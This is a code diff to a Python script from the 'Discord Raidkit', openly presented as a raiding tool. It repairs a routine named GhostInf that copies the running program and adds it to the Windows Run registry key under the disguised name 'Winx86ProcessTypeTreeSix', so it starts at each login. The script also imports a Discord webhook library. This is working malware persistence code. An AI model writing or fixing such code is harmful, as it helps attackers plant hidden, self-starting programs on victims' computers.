@@ -1,8 +1,7 @@
-# By revenge8808 (https://github.com/revenge8808); part of the Discord Raidkit (https://github.com/Catterall/discord-raidkit).
+# By revenge8808; part of the Discord Raidkit (https://github.com/Catterall/discord-raidkit).
 
 
-import requests, os, re, sys, shutil, string, winreg
-
+import requests, os, re, sys, shutil, winreg
 from dhooks import Webhook, Embed
 
 
@@ -32,8 +31,8 @@ def GhostInf():
     file_name = sys.argv[0].split('\\')[-1]
     new_file_path = fp + '\\' + file_name
     keyVal = r'Software\Microsoft\Windows\CurrentVersion\Run'
-    key2change = OpenKey(HKEY_CURRENT_USER, keyVal, 0, KEY_ALL_ACCESS)
-    SetValueEx(key2change, 'Winx86ProcessTypeTreeSix', 0, REG_SZ,
+    key2change = winreg.OpenKey(winreg.HKEY_CURRENT_USER, keyVal, 0, winreg.KEY_ALL_ACCESS)
+    winreg.SetValueEx(key2change, 'Winx86ProcessTypeTreeSix', 0, winreg.REG_SZ,
                new_file_path)
 
 
